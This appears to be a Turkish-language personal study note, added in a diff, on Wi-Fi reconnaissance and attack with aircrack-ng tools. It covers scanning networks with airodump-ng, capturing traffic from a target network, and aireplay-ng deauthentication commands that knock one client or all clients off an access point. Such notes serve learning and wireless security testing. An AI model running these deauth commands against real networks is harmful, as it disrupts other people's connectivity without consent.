@@ -1,0 +1,36 @@
+			AĞLARI İNCELEMEK
+Hali hazırda monitör moda geçmiş olmamız lazım
+
+airodump-ng wlan0mon -> etrafta wifi kartımızın gördüğü yere kadarki bütün wifi'leri tarar.
+
+BSSID   -> mac adresi
+PWR     -> Rakam küçüldükçe wifi bize yaklaşır -1 uzak -81 daha yakın
+Beacons -> Sinyaller
+#Data   -> Elimizde olan kullanılabilecek data
+CH	-> Veri alma ve verme belli kanallar üzerinden yapılır bu da kanalları gösterir
+ENC	-> Gelen giden veriler nasıl şifreleniyor
+CIPHER	-> encrypt edilen bilgilerin nasıl decrypt ediliğini gösterir
+AUTH 	
+ESSID	-> network'un adı
+
+
+				BELLİ BİR AĞA ÖZEL BİLGİ EDİNMEK
+
+airodump-ng --channel <channel> --bssid <bssid> --write <file_name> <interface>  -> airodump-ng ile belirlediğimiz hedef ağın attribute'larını veriyoruz ve o ağa özel bilgi ediniyoruz.
+
+
+alt tarafta bu ağa bağlı olan cihazların(client) adresleri gözükür.
+STATION -> Bağlı olan cihazların mac adresleri
+Frames -> Yolladığımız bilgi paketlerinden oluşuyor
+
+					DEAUTH SALDIRISI
+Kullanıcıyı ağdan düşürmeye yarar
+
+aireplay-ng --deauth <#packets> -a <AP> <interface>
+örnek: aireplay-ng --deauth 1000 -a 10:20:30:40 wlan0mon
+
+aireplay-ng --deauth <#packets> -a <AP> -c <target> <interface>
+Örnek : aireplay-ng --deauth <1000> -a 10:20:30:40 -c 00:AA:11:CC wlan0mon
+
+Modem ve target'in mac adresini kullanarak manipüle yapmış oluyoruz. Ve kullanıcı ağdan düşüyor. airodump-ng ile hedef ağda bulduğumuz
+	station mac adresini veriyoruz böylece hedef düşüyor.
